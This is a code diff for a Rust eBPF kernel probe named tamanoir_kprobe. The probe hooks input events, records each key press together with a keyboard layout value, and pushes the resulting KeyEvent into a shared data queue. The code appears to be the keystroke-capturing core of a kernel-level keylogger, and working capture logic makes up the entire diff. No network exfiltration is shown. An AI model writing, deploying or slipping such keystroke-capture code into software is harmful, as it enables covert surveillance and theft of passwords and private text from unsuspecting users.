@@ -1,14 +1,7 @@
-use aya_ebpf::{
-    macros::{kprobe, map},
-    maps::Array,
-    programs::ProbeContext,
-};
+use aya_ebpf::{macros::kprobe, programs::ProbeContext};
 
-use crate::common::DATA;
+use crate::common::{KeyEvent, DATA, KEYBOARD_LAYOUT};
 const KEY_EVENT: u32 = 1;
-
-#[map]
-static LAST_KEY: Array<u32> = Array::with_max_entries(1, 0);
 
 #[kprobe]
 pub fn tamanoir_kprobe(ctx: ProbeContext) -> u32 {
@@ -19,19 +12,17 @@ pub fn tamanoir_kprobe(ctx: ProbeContext) -> u32 {
 }
 
 fn kprobe_process(ctx: ProbeContext) -> Result<u32, u32> {
+    let layout: u8 = unsafe { core::ptr::read_volatile(&KEYBOARD_LAYOUT) };
     let event_type: u32 = ctx.arg(1).ok_or(0u32)?;
     let code: u32 = ctx.arg(2).ok_or(0u32)?;
     let value: u32 = ctx.arg(3).ok_or(0u32)?;
 
-    if event_type == KEY_EVENT && value != 0 {
-        if let Some(key) = LAST_KEY.get_ptr_mut(0) {
-            if unsafe { *key } == code {
-                unsafe { *key = 0 };
-            } else {
-                unsafe { *key = code };
-                let _ = DATA.push(&code, 0);
-            }
-        }
+    if event_type == KEY_EVENT && value == 1 {
+        let e = KeyEvent {
+            layout: layout,
+            key: code as u8,
+        };
+        let _ = DATA.push(&e, 0);
     }
 
     Ok(0)
